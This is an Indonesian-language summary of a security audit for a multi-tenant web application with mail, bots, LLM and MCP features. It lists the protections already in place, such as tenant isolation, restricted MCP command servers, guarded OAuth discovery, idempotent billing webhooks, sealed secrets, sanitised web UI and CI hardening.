- **Tenant isolation:** semua rute organisasi, mail, akun, bot, skill, LLM dan MCP me-resolve organisasi pemilik dari database sebelum `member`/`owner`. Tidak ada IDOR antar user biasa.
- **MCP command server:**
  - Hanya super user yang bisa membuat atau mengubah.
  - Environment dibatasi ke `PATH`, `HOME` + variabel server sendiri.
  - Args dibatasi, NUL ditolak.
- **OAuth discovery MCP:**
  - Lewat transport yang di-guard, tanpa proxy dari environment.
  - Menolak skema `javascript:`/`data:`, endpoint non-https, dan downgrade redirect.
- **Billing:**
  - Webhook idempoten per status; status dan kredit satu transaksi.
  - Query repository untuk pengguna atas top up, ledger dan subscription difilter `user_id`.
  - Transisi lewat webhook pembayaran tidak memakai filter `user_id`: dijaga token webhook dan `reference_id` buatan server.
  - Satu subscription hidup per user dijaga unique index.
- **Secrets:** semua kolom rahasia `json:"-"` dan disegel `SecretBox`. LLM key terikat ke base URL-nya. Header MCP terikat ke URL-nya (M-2).
- **X-Forwarded-For:** Fiber v3.5 mem-parsing dari kanan melewati trusted proxy dengan validasi IP.
- **Web-ui:**
  - react-markdown tanpa raw HTML dan tanpa gambar (H-1).
  - Iframe email tanpa `allow-scripts`; frame print meng-escape header.
  - Semua `auth_url` OAuth berasal dari server.
- **Dari audit sebelumnya:** sesi Authula HttpOnly+Secure, JWT 15 menit + cek sesi hidup, CSRF/CORS, SSRF guard saat connect, TLS IMAP/SMTP ≥ 1.2, AES-256-GCM, bind parameter SQL + whitelist `ORDER BY`, validasi input 422, header CSP/HSTS/nosniff/XFO/Referrer-Policy.
- **CI:**
  - Tidak ada script injection (`github.event.*` tidak masuk `run:`).
  - Secret Cloudflare hanya di step deploy.
